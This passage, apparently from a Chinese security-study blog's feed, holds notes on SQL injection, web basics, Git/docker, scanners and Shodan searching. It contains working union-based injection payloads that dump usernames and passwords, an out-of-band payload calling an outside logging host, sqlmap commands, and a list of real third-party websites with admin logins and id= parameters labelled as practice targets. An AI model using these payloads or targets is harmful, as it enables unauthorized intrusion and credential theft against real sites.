&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1%df&amp;#39;%20union%20select%20(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=(select%20database())%20and%20table_name=(select%20table_name%20from%20information_schema.tables%20where%20table_schema=(select%20database())limit%203,1)),2#&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1%df&amp;#39; union select(select group_concat(username,0x3b,password) from users),2#&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1%df&amp;#39;%20union%20select%20(select%20group_concat(username,0x3b,password)%20from%20users),2#&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;堆叠注入（二次注入）&lt;&#x2F;p&gt;
&lt;p&gt;带外注入&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1&amp;#39; union select load_file(&amp;#39;\\\\sql.jd14sh.ceye.io&amp;#39;)#&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;基于位置分类：&lt;&#x2F;p&gt;
&lt;p&gt;get注入&lt;&#x2F;p&gt;
&lt;p&gt;post注入&lt;&#x2F;p&gt;
&lt;p&gt;cookie注入&lt;&#x2F;p&gt;
&lt;p&gt;搜索注入&lt;&#x2F;p&gt;
&lt;p&gt;延时注入&lt;&#x2F;p&gt;
&lt;p&gt;盲注&lt;&#x2F;p&gt;
&lt;p&gt;base64注入&lt;&#x2F;p&gt;
&lt;h3 id=&quot;sqlmapde-shi-yong&quot;&gt;SQLmap的使用&lt;&#x2F;h3&gt;
&lt;p&gt;布尔注入&lt;&#x2F;p&gt;
&lt;p&gt;延时注入&lt;&#x2F;p&gt;
&lt;p&gt;显错注入&lt;&#x2F;p&gt;
&lt;p&gt;联合注入&lt;&#x2F;p&gt;
&lt;p&gt;二次（堆栈）注入&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqlmap -u &amp;quot;127.0.0.1:8915&#x2F;vul&#x2F;sqli&#x2F;sqli_str.php?name=a&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sqlmap -u &amp;quot;127.0.0.1:8915&#x2F;vul&#x2F;sqli&#x2F;sqli_str.php?name=a&amp;quot; -p name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sqlmap -r &#x2F;home&#x2F;pinginglab&#x2F;2020091601.txt&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;注意：删除请求中的特殊符号如：星号&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sqlmap -m &#x2F;home&#x2F;pinginglab&#x2F;2020091602.txt&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sqlmap -u &amp;quot;http:&#x2F;&#x2F;127.0.0.1:8915&#x2F;vul&#x2F;sqli&#x2F;sqli_id.php&amp;quot; --data &amp;quot;id=1&amp;amp;submit=%E6%9F%A5%E8%AF%A2&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   --level=LEVEL     执行测试的等级（1-5，默认为1）&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   --risk=RISK       执行测试的风险（0-3，默认为1）&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;can-kao-wen-zhang&quot;&gt;参考文章&lt;&#x2F;h3&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.freebuf.com&#x2F;sectool&#x2F;164608.html&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ichunqiu&#x2F;p&#x2F;5805108.html&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.vuln.cn&#x2F;1992&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.vuln.cn&#x2F;2035&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.91ri.org&#x2F;6775.html&lt;&#x2F;p&gt;
&lt;h3 id=&quot;li-yong-chang-jing&quot;&gt;利用场景&lt;&#x2F;h3&gt;
&lt;p&gt;获取管理员或其他用户账号密码信息&lt;&#x2F;p&gt;
&lt;p&gt;利用数据库漏洞提权（常见的是 windows 下的 mysql 提权）&lt;&#x2F;p&gt;
&lt;p&gt;获取数据库的所有信息&lt;&#x2F;p&gt;
&lt;p&gt;更改数据库中的数据，比如创建欺诈性记录、添加用户或者删除数据。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;lou-dong-wei-hai-1&quot;&gt;漏洞危害&lt;&#x2F;h3&gt;
&lt;p&gt;攻击者可以使用 sql 注入来查询数据库中其他用户的凭证（用户账号密码）&lt;&#x2F;p&gt;
&lt;p&gt;sql 注入可能导致攻击者能够完全控制数据库服务器中的所有数据。&lt;&#x2F;p&gt;
&lt;p&gt;具体危害有：
数据库信息泄露：比如泄露用户账号密码、身份证号、手机号等
网页篡改：通过操作数据库内容修改网页展示的数据
网页挂马：通过在数据库中嵌入网马链接来进行挂马攻击
恶意操作：比如清空数据库、修改系统管理员账号密码等
安装后门：利用数据库部分函数可以执行系统命令的特性给系统安装后门程序&lt;&#x2F;p&gt;
&lt;h3 id=&quot;fang-yu-fang-an-1&quot;&gt;防御方案&lt;&#x2F;h3&gt;
&lt;p&gt;过滤（低级方法，无法完全防御 sql 注入攻击）或者说输入验证 检查用户输入的合法性，以确保输入的内容为正常的数据。这里要注意的是数据检查应当在客户端和服务端都执行，之所以要执行服务端验证，是因为客户端校验往往只是减轻服务器压力和提高用户的友好度，攻击者完全有可能通过抓包修改参数或者获得网页源代码后，修改校验合法性脚本，然后将非法内容通过修改后的表单提交给服务器等等手段绕过客户端的校验。因此，要保证验证操作确实已经执行，微医的办法就是在服务端也执行验证。但是这些方法很容易出现由于过滤不严格导致恶意攻击者可能绕过这些过滤的现象，需要谨慎使用。
预编译输入
在 php 中虽然可以使用mysqli_real_escape_string来对特殊字符进行转义，但是利用编码漏洞还是可以绕过，因此更多的是使用 PDO(PHP Data Objects)。PDO 采用预处理的方式，事先创建 sql 语句模板并发送到资料库，预留的值使用参数 ？ 标记，资料库将自动检查数据格式并转换特殊字符，这样就能确保参数不会污染 sql 执行语句，保持 sql 结构性。
严格控制 sql 权限，遵循最小权限原则，防止攻击者利用 sql 注入执行高权限的危险操作。
禁止回显报错信息 恶意攻击者往往会利用这些报错信息来判断后台 sql 的拼接形式，甚至是直接利用这些报错注入将数据库中的数据通过报错信息显示出来。
密文存储数据，这样即使数据库被拖走，也能增加攻击者破解关键信息的难度。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ling&quot;&gt;另&lt;&#x2F;h3&gt;
&lt;p&gt;数据库名 database() schema()
当前登陆用户 USER() CURRENT_USER() SYSTEM_USER() SESSION_USER()
数据库版本 VERSION() @@VERSION @@GLOBAL.VERSION
路径相关 @@BASEDIR : mysql安装路径 @@SLAVE_LOAD_TMPDIR : 临时文件夹路径 @@DATADIR : 数据存储路径 @@CHARACTER_SETS_DIR : 字符集设置文件路径 @@LOG_ERROR : 错误日志文件路径 @@PID_FILE : pid-file文件路径 @@BASEDIR : mysql安装路径 @@SLAVE_LOAD_TMPDIR : 临时文件夹路径
字符串连接 concat(str1,str2) &#x2F;&#x2F;将字符串首尾相连 concat_ws(separator,str1,str2) &#x2F;&#x2F;将字符串用指定连接符连接 group_concat() &#x2F;&#x2F;将group by产生的同一个分组中的值连接起来，返回一个字符串结果。
SQL里的concat() 以及group_concat() 函数的使用
字符截断 left(str,index) &#x2F;&#x2F;从左边第index开始截取 right(str,index) &#x2F;&#x2F;从右边第index开始截取 substring(str,index) &#x2F;&#x2F;从左边index开始截取 substr(str,index,len) &#x2F;&#x2F;截取str,index开始,截取len的长度 mid(str,index,ken) &#x2F;&#x2F;截取str 从index开始,截取len的长度
字符串比较函数 strcmp(expr1,expr2)&#x2F;&#x2F;如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1 find_in_set(str,strlist) &#x2F;&#x2F;如果相同则返回1不同则返回0&lt;&#x2F;p&gt;
&lt;p&gt;绕过函数 instr(str1,substr) &#x2F;&#x2F;从子字符串中返回子串第一次出现的位置
lpad(str,len,padstr) rpad(str,len,padstr) &#x2F;&#x2F; 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果
延时函数 sleep() benchmark(1000000,sha(1))
编码函数 hex() ascii()
文件函数 load_file() &#x2F;&#x2F;读文件路径可以用0x，char转换的字符 outfile select * into outfile &#x27;&#x2F;tmp&#x2F;test.txt&#x27; dumpfile &#x2F;&#x2F;用法同上但是只能写入一行数据，常用于udf提权写dll&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>un</title>
		<published>2020-09-12T00:00:00+00:00</published>
		<updated>2020-09-12T00:00:00+00:00</updated>
		<link href="https://baz.ee/un/" type="text/html"/>
		<id>https://baz.ee/un/</id>
		<content type="html">&lt;p&gt;justify-content: center;&lt;&#x2F;p&gt;
&lt;p&gt;display: flex;&lt;&#x2F;p&gt;
&lt;p&gt;CSS中图片不要设置百分比，否则排版不顺&lt;&#x2F;p&gt;
&lt;p&gt;CSS中若想让一个块覆盖到另一个块上面，就把那个块设置成  position:absolute&lt;&#x2F;p&gt;
&lt;p&gt;CSS中不要添加多余的东西（例如多了一个“ { “），否则会使得CSS失效 &lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;http协议：超文本传输协议(HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。1960年美国人Ted Nelson构思了一种通过计算机处理文本信息的方法，并称之为超文本(hypertext),这成为了HTTP超文本传输协议标准架构的发展根基。Ted Nelson组织协调万维网协会(World Wide Web Consortium)和互联网工程工作小组(Internet Engineering Task Force )共同合作研究，最终发布了一系列的RFC，其中著名的RFC 2616定义了HTTP 1.1。&lt;&#x2F;p&gt;
&lt;p&gt;SOCKS5协议：SOCKS5 是一个代理协议，它在使用TCP&#x2F;IP协议通讯的前端机器和服务器机器之间扮演一个中介角色，使得内部网中的前端机器变得能够访问Internet网中的服务器，或者使通讯更加安全。SOCKS5 服务器通过将前端发来的请求转发给真正的目标服务器， 模拟了一个前端的行为。在这里，前端和SOCKS5之间也是通过TCP&#x2F;IP协议进行通讯，前端将原本要发送给真正服务器的请求发送给SOCKS5服务器，然后SOCKS5服务器将请求转发给真正的服务器。&lt;&#x2F;p&gt;
&lt;p&gt;https协议：HTTPS(全称：Hyper Text Transfer Protocol over Secure Socket Layer 或 Hypertext Transfer Protocol Secure，超文本传输安全协议)，是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 它是一个URI scheme(抽象标识符体系)，句法类同http:体系。用于安全的HTTP数据传输。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密&#x2F;身份验证层(在HTTP与TCP之间)。这个系统的最初研发由网景公司(Netscape)进行，并内置于其浏览器Netscape Navigator中，提供了身份验证与加密通讯方法。现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。&lt;&#x2F;p&gt;
&lt;p&gt;最小权限原则&lt;&#x2F;p&gt;
&lt;p&gt;常见端口及服务：&lt;&#x2F;p&gt;
&lt;p&gt;21 ftp&lt;&#x2F;p&gt;
&lt;p&gt;22 ssh&lt;&#x2F;p&gt;
&lt;p&gt;23 telnet&lt;&#x2F;p&gt;
&lt;p&gt;80 http&lt;&#x2F;p&gt;
&lt;p&gt;443 openssl&lt;&#x2F;p&gt;
&lt;p&gt;445 smb&lt;&#x2F;p&gt;
&lt;p&gt;3306 mysql&lt;&#x2F;p&gt;
&lt;p&gt;5432 postgresql&lt;&#x2F;p&gt;
&lt;p&gt;3389 rdp (win远程桌面)&lt;&#x2F;p&gt;
&lt;p&gt;5901 vnc (linux远程桌面)&lt;&#x2F;p&gt;
&lt;p&gt;27017、28017 monogodb&lt;&#x2F;p&gt;
&lt;p&gt;50060、50030 hadoop&lt;&#x2F;p&gt;
&lt;p&gt;8080&lt;&#x2F;p&gt;
&lt;p&gt;smb&lt;&#x2F;p&gt;
&lt;p&gt;nfs&lt;&#x2F;p&gt;
&lt;p&gt;webdav&lt;&#x2F;p&gt;
&lt;p&gt;sshfs&lt;&#x2F;p&gt;
&lt;p&gt;常见的Linux桌面环境&lt;&#x2F;p&gt;
&lt;p&gt;unity&lt;&#x2F;p&gt;
&lt;p&gt;kde&lt;&#x2F;p&gt;
&lt;p&gt;gnome&lt;&#x2F;p&gt;
&lt;p&gt;mate&lt;&#x2F;p&gt;
&lt;p&gt;xfce&lt;&#x2F;p&gt;
&lt;p&gt;xorg&lt;&#x2F;p&gt;
&lt;p&gt;nmap 防火墙绕过技巧&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.butian.net&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.cnvd.org.cn&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;bugcloud.360.cn&#x2F;home&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.bugbank.cn&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;hackerone.com&#x2F;88&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.cloudflare.com&#x2F;zh-cn&#x2F;learning&#x2F;security&#x2F;threats&#x2F;owasp-top-10&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;零信任漏洞&lt;&#x2F;p&gt;
&lt;p&gt;用户账户体系：认证、授权、会话管理&lt;&#x2F;p&gt;
&lt;p&gt;内容安全&lt;&#x2F;p&gt;
&lt;p&gt;设计缺陷&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Git</title>
		<published>2020-09-11T00:00:00+00:00</published>
		<updated>2020-09-11T00:00:00+00:00</updated>
		<link href="https://baz.ee/git/" type="text/html"/>
		<id>https://baz.ee/git/</id>
		<content type="html">&lt;h1 id=&quot;git&quot;&gt;Git&lt;&#x2F;h1&gt;
&lt;p&gt;https:&#x2F;&#x2F;backlog.com&#x2F;git-tutorial&#x2F;cn&#x2F;intro&#x2F;intro1_2.html&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;backlog.com&#x2F;git-tutorial&#x2F;cn&#x2F;intro&#x2F;intro1_2.html&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;git-scm.com&#x2F;book&#x2F;zh&#x2F;v2&#x2F;%E8%B5%B7%E6%AD%A5-%E8%8E%B7%E5%8F%96%E5%B8%AE%E5%8A%A9&lt;&#x2F;p&gt;
&lt;p&gt;下载远程项目：git clone&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;h1 id=&quot;docker&quot;&gt;docker&lt;&#x2F;h1&gt;
&lt;p&gt;查找镜像：docker search hello-world&lt;&#x2F;p&gt;
&lt;p&gt;获取镜像：docker pull&lt;&#x2F;p&gt;
&lt;p&gt;运行镜像：docker run&lt;&#x2F;p&gt;
&lt;p&gt;查看运行的容器：docker ps       docker ps -a&lt;&#x2F;p&gt;
&lt;p&gt;操作容器：docker stop&#x2F;start&#x2F;rm&lt;&#x2F;p&gt;
&lt;p&gt;删除镜像：docker rmi&lt;&#x2F;p&gt;
&lt;p&gt;删除所有容器：docker rm $(docker ps -a -q)&lt;&#x2F;p&gt;
&lt;p&gt;删除所有镜像：docker rmi $(docker images -q)&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>靶机</title>
		<published>2020-09-10T00:00:00+00:00</published>
		<updated>2020-09-10T00:00:00+00:00</updated>
		<link href="https://baz.ee/ba-ji/" type="text/html"/>
		<id>https://baz.ee/ba-ji/</id>
		<content type="html">&lt;p&gt;http:&#x2F;&#x2F;www.uky.edu&#x2F;AS&#x2F;PoliSci&#x2F;Peffley&#x2F;wp&#x2F;phpinfo.php&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;bbs.pku.edu.cn&#x2F;attach&#x2F;3f&#x2F;63&#x2F;3f6387aebc9877ba&#x2F;Step-By-Step1.0.pdf&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;http:&#x2F;&#x2F;edua.hk&#x2F;download&#x2F;04.pdf&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.wenqujingdian.com&#x2F;Public&#x2F;editor&#x2F;attached&#x2F;file&#x2F;20180611&#x2F;20180611140110_64398.pdf&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.shodan.io&#x2F;host&#x2F;69.85.19.153&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;13.113.253.231&#x2F;auth&#x2F;login?redirect=%2F&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;173.196.57.250&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.cutis.com.hk&#x2F;promotion_detail.php?id=11&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.scimagojr.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.equivalences.cfwb.be&#x2F;index.php?id=524&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.tuc.gr&#x2F;index.php?id=5397&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.fifi.in&#x2F;events-detail.php?id=2&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;sreema.org&#x2F;gallery-details.php?id=1&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;iitj.ac.in&#x2F;faculty&#x2F;index.php?id=me&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;yh.yali.edu.cn&#x2F;index.php?m=admin&amp;amp;c=index&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;mlaapp.com&#x2F;schooladmin&#x2F;login.php&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.stpsb.org&#x2F;search&#x2F;admin&#x2F;admin.php&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.managemydirectory.com&#x2F;admin&#x2F;login.php&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;jjtg.citicsteel.com&#x2F;Home&#x2F;Login&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.zotero.org&#x2F;user&#x2F;login&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.tumuga.co.za&#x2F;contact_form&#x2F;admin.php&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.christiancourier.ca&#x2F;admin.php?&#x2F;cp&#x2F;login?return=&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;clicken1.com&#x2F;wp-login.php?redirect_to=https%3A%2F%2Fclicken1.com%2Fwp-admin%2F&amp;amp;reauth=1&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;login.classy.org&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.ugc.ac.in&#x2F;grievance&#x2F;adminlogin.aspx&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.steinrockroofing.com&#x2F;admin&#x2F;login.asp&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;ycmouoa.digitaluniversity.ac&#x2F;adminlogin&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.scoobysanimalmission.org&#x2F;sampets&#x2F;admin.php&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;chefilan.com&#x2F;blog&#x2F;wp-login.php&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.scoobysanimalmission.org&#x2F;sampets&#x2F;admin.php&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;cs.mtech.edu&#x2F;institute&#x2F;login.php&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.ciqs-bc.org&#x2F;english&#x2F;admin-login&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.alltimecargo.com&#x2F;login.php&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>扫描器</title>
		<published>2020-09-07T00:00:00+00:00</published>
		<updated>2020-09-07T00:00:00+00:00</updated>
		<link href="https://baz.ee/sao-miao-qi/" type="text/html"/>
		<id>https://baz.ee/sao-miao-qi/</id>
		<content type="html">&lt;p&gt;nessus&lt;&#x2F;p&gt;
&lt;p&gt;openvas&lt;&#x2F;p&gt;
&lt;p&gt;burpsuite&lt;&#x2F;p&gt;
&lt;p&gt;nikto&lt;&#x2F;p&gt;
&lt;p&gt;rsas&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;绿盟远程安全评估系统&lt;&#x2F;p&gt;
&lt;p&gt;safe3&lt;&#x2F;p&gt;
&lt;p&gt;awvs&lt;&#x2F;p&gt;
&lt;p&gt;【问】nessus、burpsuite有什么区别&lt;&#x2F;p&gt;
&lt;p&gt;【答】nessus是爬虫式扫描，burpsuite是代理式扫描器。&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Shodan Hacking</title>
		<published>2020-09-07T00:00:00+00:00</published>
		<updated>2020-09-07T00:00:00+00:00</updated>
		<link href="https://baz.ee/shodan-hacking/" type="text/html"/>
		<id>https://baz.ee/shodan-hacking/</id>
		<content type="html">&lt;h1 id=&quot;shodan-hacking&quot;&gt;Shodan Hacking&lt;&#x2F;h1&gt;
&lt;p&gt;Shodan是搜索联网设备的搜索引擎&lt;&#x2F;p&gt;
&lt;p&gt;搜索web服务器、防火墙、路由交换机、摄像头、打印机等&lt;&#x2F;p&gt;
&lt;p&gt;支持chrome和Firefox插件&lt;&#x2F;p&gt;
&lt;p&gt;支持命令行&lt;&#x2F;p&gt;
&lt;p&gt;pip3 install shodan&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;Shodan采集的基本数据单位是banner&lt;&#x2F;p&gt;
&lt;p&gt;banner是描述设备所运行服务的标志性文本信息。banner的内容因服务类型的不同而不同。&lt;&#x2F;p&gt;
&lt;p&gt;除了banner信息外，Shodan还可以搜索设备元数据（地理位置、主机名、操作系统等）。此外，Shodan现在也开始搜集ipv6有关的在线设备了。&lt;&#x2F;p&gt;
&lt;p&gt;Shodan的爬虫是全天候工作的，并且分布于世界各地。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ying-yong-chang-jing&quot;&gt;应用场景&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;特定的网络设备&lt;&#x2F;li&gt;
&lt;li&gt;自己用0day批量攻击&lt;&#x2F;li&gt;
&lt;li&gt;拥有特定数据特征的后门&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;ji-ben-shi-yong&quot;&gt;基本使用&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;country:&lt;&#x2F;code&gt;country:US 基于国家搜索&lt;&#x2F;p&gt;
&lt;p&gt;​                                 基于服务搜索&lt;&#x2F;p&gt;
&lt;p&gt;​                                 基于服务&#x2F;协议搜索&lt;&#x2F;p&gt;
&lt;p&gt;​                                 基于设备指纹搜索&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;product&lt;&#x2F;code&gt;搜索特定的产品&#x2F;服务&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;version&lt;&#x2F;code&gt;搜索特定的版本号&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;port&lt;&#x2F;code&gt;搜索特定的端口号&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;hostname：搜索指定的主机或域名，例如 hostname:&amp;quot;google&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;port：搜索指定的端口或服务，例如 port:&amp;quot;21&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;country：搜索指定的国家，例如 country:&amp;quot;CN&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;city：搜索指定的城市，例如 city:&amp;quot;Hefei&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;org：搜索指定的组织或公司，例如 org:&amp;quot;google&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;isp：搜索指定的ISP供应商，例如 isp:&amp;quot;China Telecom&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;product：搜索指定的操作系统&#x2F;软件&#x2F;平台，例如 product:&amp;quot;Apache httpd&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;version：搜索指定的软件版本，例如 version:&amp;quot;1.6.2&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;geo：搜索指定的地理位置，参数为经纬度，例如 geo:&amp;quot;31.8639, 117.2808&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;before&#x2F;after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:&amp;quot;11-11-15&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;net：搜索指定的IP地址或子网，例如 net:&amp;quot;210.45.240.0&#x2F;24&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;category 现有的分类：ics, malware 例如 category:&amp;quot;malware&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;os 操作系统 例如 os:&amp;quot;Windows 7 or 8&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;country:CN product:&amp;quot;HUAWEI&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;os:&amp;quot;windows&amp;quot; port:3389 net:&amp;quot;107.160.1.0&#x2F;24&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;【问】常见的物联网设备有哪些？&lt;&#x2F;p&gt;
&lt;p&gt;【问】这些物联网设备的默认密码是什么？&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>DNS</title>
		<published>2020-09-05T00:00:00+00:00</published>
		<updated>2020-09-05T00:00:00+00:00</updated>
		<link href="https://baz.ee/dns/" type="text/html"/>
		<id>https://baz.ee/dns/</id>
		<content type="html">&lt;h1 id=&quot;dnszhong-de-qi-da-zi-yuan-ji-lu-jie-shao&quot;&gt;DNS中的七大资源记录介绍&lt;&#x2F;h1&gt;
&lt;p&gt;在Microsoft产品系列中，ADDS是一个很出色的设计平台，说到AD，那么我们就不得不提起他的合作伙伴--DNS，相信大家都知道，DNS在AD中的重要地位，就如男人和女人一样，要想有所作为，他们2个就必须进行结合，缺少任何一方，这个社会也就失去了色彩！) DNS分为正向查找区域和反向查找区域，然后在分为，主要，辅助，存根区域，在这些区域里，又存在着很多的记录，今天，就让我们来看看这些记录：&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;1，A记录
